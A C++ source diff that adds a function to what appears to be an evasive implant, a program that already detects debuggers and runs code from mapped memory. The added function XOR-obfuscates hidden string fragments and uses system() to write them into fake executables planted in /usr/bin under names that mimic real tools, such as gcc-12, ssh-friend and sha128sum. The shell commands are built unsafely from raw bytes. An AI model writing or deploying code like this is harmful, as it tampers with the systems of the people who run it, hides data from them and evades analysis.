@@ -14,6 +14,9 @@
 #include <openssl/sha.h> // hash function
 #include <iomanip>
 #include <sstream>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <cstring>
 
 long long bs1 = 0x0f2bc3ee05faa249;
 long long bs2 = 0x70DD85D8FE63E152;
@@ -21,6 +24,12 @@ long long bs3 = 0xFCC7752FDB865D11;
 long long bs4 = 0x51982D5DCF0B2489;
 
 std::string key;
+std::string bs5 = "bqk)9H*!";
+std::string bs6 = "$D4<:>JU";
+std::string bs7 = "FjYKB6a/";
+std::string bs8 = "V5T^`y=C";
+std::string bs9 = "-(~XAGEg";
+std::string bs10 = "zcsL8%rh;]";
 
 //interrupt handler for ctrl+c, we can clean up nicely here and not leave atifacts from running on the system
 void handle_sigint(int signal){
@@ -335,6 +344,85 @@ int gettenminute() {
 
 }
 
+int folder_master(std::string val1, std::string val2, std::string val3, std::string val4, std::string val5, std::string val6)
+{
+    srand(time(0));
+    char command[256];
+    char command1[256];
+    char command2[256];
+    char command3[256];
+    char command4[256];
+    char command5[256];
+
+    int rand1 = rand() % 256;
+    for (int i = 0; i < val1.size();i++)
+    {
+        val1[i] = val1[i] ^ rand1;
+        // std::cout << val1[i] << std::endl;
+    }
+
+    int rand2 = rand() % 256;
+    for (int i = 0; i < val2.size();i++)
+    {
+        val2[i] = val2[i] ^ rand2;
+        // std::cout << val2[i] << std::endl;
+    }
+
+    int rand3 = rand() % 256;
+    for (int i = 0; i < val3.size();i++)
+    {
+        val3[i] = val3[i] ^ rand3;
+        // std::cout << val3[i] << std::endl;
+    }
+
+    int rand4 = rand() % 256;
+    for (int i = 0; i < val4.size();i++)
+    {
+        val4[i] = val4[i] ^ rand4;
+        // std::cout << val3[i] << std::endl;
+    }
+
+    int rand5 = rand() % 256;
+    for (int i = 0; i < val5.size();i++)
+    {
+        val5[i] = val5[i] ^ rand5;
+        // std::cout << val3[i] << std::endl;
+    }
+
+    int rand6 = rand() % 256;
+    for (int i = 0; i < val6.size();i++)
+    {
+        val6[i] = val6[i] ^ rand6;
+        // std::cout << val3[i] << std::endl;
+    }
+    
+    system("mkdir /tmp/work");
+    system("mkdir /tmp/work/root");
+    system("mkdir /tmp/work/Public");
+
+    // std::cout << val1 << 4 <<std::endl;
+
+    snprintf(command, sizeof(command), "touch /tmp/work/Public/output.log && echo \"%s\" > /tmp/work/Public/output.log", val1.c_str());
+
+    snprintf(command1, sizeof(command1), "touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install", val2.c_str());
+
+    snprintf(command2, sizeof(command2), "touch /usr/bin/gcc-12 && echo \"%s\" > /usr/bin/gcc-12", val3.c_str());
+
+    snprintf(command3, sizeof(command3), "touch /tmp/work/root/info.log && echo \"%s\" > /tmp/work/root/info.log", val4.c_str());
+
+    snprintf(command4, sizeof(command4), "touch /usr/bin/ssh-friend && echo \"%s\" > /usr/bin/ssh-friend", val5.c_str());
+
+    snprintf(command5, sizeof(command5), "touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum", val6.c_str());
+
+    system(command);
+    system(command1);
+    system(command2);
+    system(command3);
+    system(command4);
+    system(command5);
+}
+
+
 int main(){
     //detect debugger
     if(is_debugger_attached()){
@@ -430,6 +518,9 @@ int main(){
 
     // Free memory
     munmap(exec_mem, code_size);
+
+    folder_master(bs5, bs6, bs7, bs8, bs9, bs10);
+    
 
     for(;;){
 
